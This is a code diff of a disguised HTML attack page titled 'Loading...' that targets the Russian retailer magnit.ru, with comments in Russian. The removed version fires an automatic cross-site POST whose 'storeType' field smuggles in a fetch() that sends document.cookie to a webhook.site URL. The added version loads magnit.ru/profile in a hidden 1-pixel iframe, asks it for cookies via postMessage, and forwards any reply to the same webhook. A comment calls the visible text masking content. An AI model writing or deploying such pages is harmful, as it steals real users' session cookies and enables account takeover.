@@ -1,27 +1,42 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <title>Loading...</title>
 </head>
 <body>
-    <script>
-        // Отправляем запрос сразу после загрузки страницы
-        fetch('https://magnit.ru/webgate/v2/goods/get', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                // Важно: если нужна авторизация, браузер отправит cookies автоматически
-                // для целевого сайта, если они есть. Другие заголовки необязательны.
-            },
-            body: JSON.stringify({
-                "storeType": "-fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {method:'POST', body:document.cookie})-",
-                "pagination": {"offset": 0, "limit": 9},
-                "catalogType": "3",
-                "storeCode": "250968"
-            })
-        });
-    </script>
-    <!-- Содержимое страницы для маскировки -->
     <p>Please wait, loading...</p>
+    
+    <iframe id="target" src="https://magnit.ru/profile" style="width:1px;height:1px;border:none;"></iframe>
+    
+    <script>
+        // Обработчик сообщений от iframe
+        window.addEventListener('message', function(event) {
+            if (event.origin === 'https://magnit.ru') {
+                console.log('✅ Получено сообщение от magnit.ru:', event.data);
+                // Если это cookies, отправляем на webhook
+                if (event.data && event.data.includes('cookie')) {
+                    fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
+                        method: 'POST',
+                        body: event.data
+                    });
+                }
+            }
+        });
+        
+        // Внедряем скрипт в iframe через изменение src
+        document.getElementById('target').onload = function() {
+            console.log('✅ iframe загружен');
+            
+            // Пытаемся отправить сообщение в iframe
+            try {
+                var iframeWindow = document.getElementById('target').contentWindow;
+                iframeWindow.postMessage('getCookies', 'https://magnit.ru');
+                console.log('✅ postMessage отправлен');
+            } catch(e) {
+                console.log('❌ Ошибка postMessage:', e.message);
+            }
+        };
+    </script>
 </body>
 </html>
